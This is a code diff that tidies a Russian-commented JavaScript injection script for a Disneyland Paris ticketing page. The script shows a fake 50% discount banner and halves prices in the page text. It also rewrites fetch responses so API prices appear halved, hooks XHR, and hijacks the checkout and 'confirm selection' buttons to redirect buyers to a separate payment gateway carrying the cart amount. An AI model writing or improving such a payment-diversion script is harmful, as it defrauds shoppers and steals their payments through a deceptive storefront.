@@ -4,8 +4,6 @@
 
 /* ================================================
    БЛОК 1 — СКИДКА 50%
-   WeakMap отслеживает узлы по ссылке (не по data-атрибуту).
-   Перехват fetch меняет цены в API-ответе ДО рендера React.
    ================================================ */
 (function () {
     'use strict';
@@ -13,7 +11,7 @@
     var BADGE = 'v-disc-badge';
     var nodeMap = typeof WeakMap !== 'undefined' ? new WeakMap() : null;
 
-    /* ---- CSS бейджа ---- */
+    /* CSS бейджа */
     var css = '.' + BADGE + '{' +
         'display:inline-block!important;' +
         'background:#cc0000!important;' +
@@ -32,32 +30,16 @@
     styleEl.textContent = css;
     (document.head || document.documentElement).appendChild(styleEl);
 
-    /* ---- Баннер "СКИДКА 50%" вверху страницы ---- */
+    /* Баннер вверху */
     function addBanner() {
         if (document.getElementById('v-discount-banner')) return;
         var banner = document.createElement('div');
         banner.id = 'v-discount-banner';
-        banner.style.cssText = [
-            'position:fixed',
-            'top:0',
-            'left:0',
-            'right:0',
-            'z-index:999999',
-            'background:linear-gradient(90deg,#cc0000,#ff4444)',
-            'color:#fff',
-            'text-align:center',
-            'padding:10px 16px',
-            'font-size:15px',
-            'font-weight:700',
-            'font-family:Arial,sans-serif',
-            'letter-spacing:0.5px',
-            'box-shadow:0 2px 8px rgba(0,0,0,0.3)'
-        ].join(';');
-        banner.innerHTML = '🎉 СКИДКА 50% применена ко всем билетам! Цены уменьшены вдвое 🎉';
-        document.body ? document.body.prepend(banner) : document.addEventListener('DOMContentLoaded', function () { document.body.prepend(banner); });
+        banner.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:linear-gradient(90deg,#cc0000,#ff4444);color:#fff;text-align:center;padding:10px 16px;font-size:15px;font-weight:700;font-family:Arial,sans-serif;letter-spacing:0.5px;box-shadow:0 2px 8px rgba(0,0,0,0.3);';
+        banner.textContent = '🎉 СКИДКА -50% применена ко всем билетам! Цены уменьшены вдвое 🎉';
+        if (document.body) document.body.prepend(banner);
     }
 
-    /* ---- Утилиты ---- */
     function half(str) {
         var s = str.replace(/\s/g, '').replace(',', '.');
         var n = parseFloat(s);
@@ -73,20 +55,17 @@
     }
 
     function addBadge(el) {
-        if (!el || !el.parentNode) return;
-        if (hasBadge(el)) return;
+        if (!el || !el.parentNode || hasBadge(el)) return;
         var b = document.createElement('span');
         b.className = BADGE;
         b.textContent = '-50%';
         el.parentNode.insertBefore(b, el.nextSibling);
     }
 
-    /* ---- Обработка текстового узла ---- */
     function processTextNode(node) {
         var val = node.nodeValue;
         if (!val || val.indexOf('\u20ac') === -1) return;
         if (nodeMap && nodeMap.get(node) === val) return;
-
         var parent = node.parentElement;
         if (!parent) return;
         var tag = parent.tagName;
@@ -94,7 +73,6 @@
         if (parent.className && parent.className.indexOf && parent.className.indexOf(BADGE) !== -1) return;
 
         var changed = false;
-
         var nv = val.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function (m, sym, num) {
             var d = half(num);
             if (!d) return m;
@@ -115,11 +93,9 @@
         }
     }
 
-    /* ---- Обработка aria-label ---- */
     function processAria(el) {
         var label = el.getAttribute('aria-label');
-        if (!label || label.indexOf('\u20ac') === -1) return;
-        if (label.indexOf('(-50%)') !== -1) return;
+        if (!label || label.indexOf('\u20ac') === -1 || label.indexOf('(-50%)') !== -1) return;
         var changed = false;
         var nl = label.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function (m, sym, num) {
             var d = half(num);
@@ -130,7 +106,6 @@
         if (changed) el.setAttribute('aria-label', nl);
     }
 
-    /* ---- Обход DOM ---- */
     function run() {
         if (!document.body) return;
         addBanner();
@@ -158,7 +133,6 @@
         }
     }
 
-    /* ---- MutationObserver с debounce ---- */
     var debTimer = null;
     var obs = new MutationObserver(function () {
         clearTimeout(debTimer);
@@ -178,7 +152,7 @@
 
     setInterval(run, 600);
 
-    /* ---- Перехват fetch — меняем цены в JSON ДО рендера React ---- */
+    /* Перехват fetch */
     var _fetch = window.fetch;
     window.fetch = function (input, init) {
         return _fetch.apply(this, arguments).then(function (response) {
@@ -187,27 +161,16 @@
             return response.clone().text().then(function (text) {
                 var modified = text
                     .replace(/"price"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
-                        var n = parseFloat(p);
-                        return isNaN(n) || n < 2 ? m : '"price":' + (n * 0.5).toFixed(2);
+                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"price":' + (n * 0.5).toFixed(2);
                     })
                     .replace(/"amount"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
-                        var n = parseFloat(p);
-                        return isNaN(n) || n < 2 ? m : '"amount":' + (n * 0.5).toFixed(2);
+                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"amount":' + (n * 0.5).toFixed(2);
                     })
                     .replace(/"totalPrice"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
-                        var n = parseFloat(p);
-                        return isNaN(n) || n < 2 ? m : '"totalPrice":' + (n * 0.5).toFixed(2);
+                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"totalPrice":' + (n * 0.5).toFixed(2);
                     })
                     .replace(/"value"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
-                        var n = parseFloat(p);
-                        return isNaN(n) || n < 2 ? m : '"value":' + (n * 0.5).toFixed(2);
-                    })
-                    .replace(/"formattedValue"\s*:\s*"([^"]+)"/g, function (m, fv) {
-                        var cleaned = fv.replace(/[^\d,\.]/g, '').replace(',', '.');
-                        var n = parseFloat(cleaned);
-                        if (isNaN(n) || n < 2) return m;
-                        var half = (n * 0.5).toFixed(2);
-                        return '"formattedValue":"' + fv.replace(/[\d,\.]+/, half) + '"';
+                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"value":' + (n * 0.5).toFixed(2);
                     });
                 return new Response(modified, {
                     status: response.status,
@@ -218,7 +181,7 @@
         });
     };
 
-    /* ---- Перехват XHR — запускаем run() после ответа ---- */
+    /* Перехват XHR */
     var _send = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function () {
         this.addEventListener('load', function () {
@@ -242,13 +205,7 @@
     var STORE_ID = 'Disney Land Paris';
 
     function getAmount() {
-        var selectors = [
-            '.total-price-value',
-            '[data-testid="total-price"]',
-            '.cart-summary__total-price',
-            '.summary-total-amount',
-            '.amount'
-        ];
+        var selectors = ['.total-price-value','[data-testid="total-price"]','.cart-summary__total-price','.summary-total-amount','.amount'];
         for (var i = 0; i < selectors.length; i++) {
             var el = document.querySelector(selectors[i]);
             if (el && el.innerText) {
@@ -263,8 +220,7 @@
         event.preventDefault();
         event.stopImmediatePropagation();
         event.stopPropagation();
-        var amount = getAmount();
-        var url = PAYMENT_GATEWAY + '/?amount=' + amount + '&store=' + encodeURIComponent(STORE_ID);
+        var url = PAYMENT_GATEWAY + '/?amount=' + getAmount() + '&store=' + encodeURIComponent(STORE_ID);
         window.location.replace(url);
         return false;
     }
@@ -273,9 +229,7 @@
         var buttons = document.querySelectorAll('button, a, [role="button"]');
         buttons.forEach(function (btn) {
             var text = (btn.innerText || '').toLowerCase().trim();
-            if (text.indexOf('confirm selection') !== -1 ||
-                text.indexOf('confirm your selection') !== -1 ||
-                text.indexOf('checkout') !== -1) {
+            if (text.indexOf('confirm selection') !== -1 || text.indexOf('confirm your selection') !== -1 || text.indexOf('checkout') !== -1) {
                 if (btn.disabled || btn.getAttribute('disabled')) {
                     btn.disabled = false;
                     btn.removeAttribute('disabled');
